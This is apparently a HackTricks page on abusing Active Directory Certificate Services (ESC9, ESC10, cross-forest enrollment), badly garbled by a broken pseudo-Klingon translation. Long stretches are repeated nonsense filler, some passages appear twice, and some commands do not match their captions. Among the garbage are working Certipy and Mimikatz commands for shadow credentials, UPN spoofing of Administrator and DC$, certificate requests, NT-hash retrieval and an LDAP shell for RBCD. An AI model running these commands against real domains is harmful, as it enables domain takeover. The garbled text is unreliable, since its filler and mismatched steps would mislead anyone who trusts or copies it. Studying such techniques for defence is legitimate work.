'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhutlh'e' 'e' vItlhut
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Subsequently, `Jane`'s `userPrincipalName` is modified to `Administrator`, purposely omitting the `@corp.local` domain part:

---
qaStaHvIS `Jane`'s `userPrincipalName` `Administrator` laH, `@corp.local` domain part jatlhqa'chugh:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
**Translation:**

**This modification does not violate constraints, given that `Administrator@corp.local` remains distinct as `Administrator`'s `userPrincipalName`.**

Following this, the `ESC9` certificate template, marked vulnerable, is requested as `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
**Translation:**

It's noted that the certificate's `userPrincipalName` reflects `Administrator`, devoid of any “object SID”.

`Jane`'s `userPrincipalName` is then reverted to her original, `Jane@corp.local`:

**Translation (Klingon):**

Qapla'! QaStaHvIS certificate 'ej 'ay' 'e' vItlhutlh 'e' luqta' 'e' `userPrincipalName` 'e' `Administrator`, vItlhutlh "object SID" vItlhutlh.

`Jane`'e' `userPrincipalName` vItlhutlh, `Jane@corp.local`, vItlhutlh:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
### Domain Escalation

#### Authentication with Issued Certificate

To authenticate with the issued certificate, use the following command:

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator@corp.local"'
```

This command will yield the NT hash of `Administrator@corp.local`. Remember to include the `-domain <domain>` parameter in the command due to the certificate's lack of domain specification.
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Qa'legh Certificate Mappings - ESC10

### Qap

Qa'legh registry key values Hoch 'ej 'ej Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch Hoch
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Qong, `Jane`'s `userPrincipalName` jatlh `Administrator`-e' vItlhutlh, `@corp.local` qutlhlaHbe'chugh vItlhutlhlaHbe'chugh, vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaH
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
**DaH jImej**, `Jane` vItlhutlhlaHchugh, `User` template vItlhutlhlaHchugh, client authentication jatlhqa' certificate vItlhutlhlaHchugh.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` is then reverted to its original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.

**Klingon Translation:**

Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` vItlh `UPN` bit flag (`0x4`) veb chaw' account A vItlh `GenericWrite` permissions vItlh account B vItlh `userPrincipalName` property vebmey, machine accounts je built-in domain administrator `Administrator` vItlh compromise laH.

ngoD, `DC$@corp.local` vItlh compromise laH, `Jane`'s hash through Shadow Credentials vItlh ghaH, `GenericWrite` vItlh leverage.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.

`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
`Jane` using the default `User` template: `Jane` vItlhutlhla' `User` template vItlhutlhla' 'ej client authentication certificate vItlhutlhla'.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` is reverted to its original after this process.

`Jane`'s `userPrincipalName` jatlhqa'pu' 'e' vItlhutlh.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
To authenticate via Schannel, Certipy's `-ldap-shell` option is utilized, indicating authentication success as `u:CORP\DC$`.

---

**Klingon Translation:**

Schannel jatlh Certipy's `-ldap-shell` qutlh, `u:CORP\DC$` jatlh authentication success jatlh.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
### Domain Escalation

#### LDAP Shell

Through the LDAP shell, commands such as `set_rbcd` enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.

---

### QIn Hoch

#### LDAP Shell

DaH jatlh LDAP shell, 'ejDI' 'e' vItlhutlhlu'pu' Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.

---
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.

## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

The configuration for **cross-forest enrollment** is made relatively straightforward. The **root CA certificate** from the resource forest is **published to the account forests** by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates` and AIA containers in each account forest**. To clarify, this arrangement grants the **CA in the resource forest complete control** over all other forests for which it manages PKI. Should this CA be **compromised by attackers**, certificates for all users in both the resource and account forests could be **forged by them**, thereby breaking the security boundary of the forest.

### Enrollment Privileges Granted to Foreign Principals

In multi-forest environments, caution is required concerning Enterprise CAs that **publish certificate templates** which allow **Authenticated Users or foreign principals** (users/groups external to the forest to which the Enterprise CA belongs) **enrollment and edit rights**.\
Upon authentication across a trust, the **Authenticated Users SID** is added to the user’s token by AD. Thus, if a domain possesses an Enterprise CA with a template that **allows Authenticated Users enrollment rights**, a template could potentially be **enrolled in by a user from a different forest**. Likewise, if **enrollment rights are explicitly granted to a foreign principal by a template**, a **cross-forest access-control relationship is thereby created**, enabling a principal from one forest to **enroll in a template from another forest**.

Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
